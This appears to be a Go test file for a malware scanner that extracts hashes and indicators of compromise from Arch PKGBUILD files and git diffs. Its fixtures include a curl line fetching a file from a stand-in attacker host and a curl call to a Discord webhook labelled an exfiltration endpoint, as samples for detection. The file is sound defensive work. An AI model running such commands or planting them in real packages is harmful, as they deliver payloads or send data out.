package ioc

import (
	"testing"

	"github.com/vulnetix/malscan-engine/detect"
)

func TestDeclaredHashes(t *testing.T) {
	repo := &RepoData{PkgbuildContent: `pkgname=demo
source=('app.tar.gz' 'extra.tar.gz')
sha256sums=('44d88612fea8a8f36de82e1278abb02f5a1c2d4d1b9e0c8f6b3a2e1d0c9b8a77'
            'SKIP')
b2sums=('SKIP')
`}
	got := DeclaredHashes(repo)
	if len(got) != 1 || got[0] != "44d88612fea8a8f36de82e1278abb02f5a1c2d4d1b9e0c8f6b3a2e1d0c9b8a77" {
		t.Fatalf("DeclaredHashes = %v, want the single sha256 (SKIP excluded)", got)
	}
}

func TestCandidateHashesIncludesDiffHash(t *testing.T) {
	diff := "+curl -o /tmp/x https://evil.example/p\n" +
		"+# embedded sha 9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08\n"
	repo := &RepoData{
		PkgbuildContent: "sha256sums=('44d88612fea8a8f36de82e1278abb02f5a1c2d4d1b9e0c8f6b3a2e1d0c9b8a77')\n",
		GitLog:          []detect.GitCommit{{Diff: diff}},
	}
	want := map[string]bool{
		"44d88612fea8a8f36de82e1278abb02f5a1c2d4d1b9e0c8f6b3a2e1d0c9b8a77": false,
		"9f86d081884c7d659a2feaa0c55ad015a3bf4f1b2b0b822cd15d6c15b0f00a08": false,
	}
	for _, h := range CandidateHashes(repo) {
		if _, ok := want[h]; ok {
			want[h] = true
		}
	}
	for h, seen := range want {
		if !seen {
			t.Errorf("CandidateHashes missing %s", h)
		}
	}
}

func TestExtractIOCsExfilAndWallet(t *testing.T) {
	repo := &RepoData{
		PkgbuildContent: "curl https://discord.com/api/webhooks/123/abc\n# btc 1A1zP1eP5QGefi2DMPTfTL5SLmv7DivfNa\n",
	}
	var gotExfil, gotWallet bool
	for _, i := range ExtractIOCs(repo) {
		if i.Type == "exfil-endpoint" {
			gotExfil = true
		}
		if i.Type == "wallet" && i.Ecosystem == "bitcoin" {
			gotWallet = true
		}
	}
	if !gotExfil {
		t.Error("expected an exfil-endpoint IOC for the discord webhook")
	}
	if !gotWallet {
		t.Error("expected a bitcoin wallet IOC")
	}
}
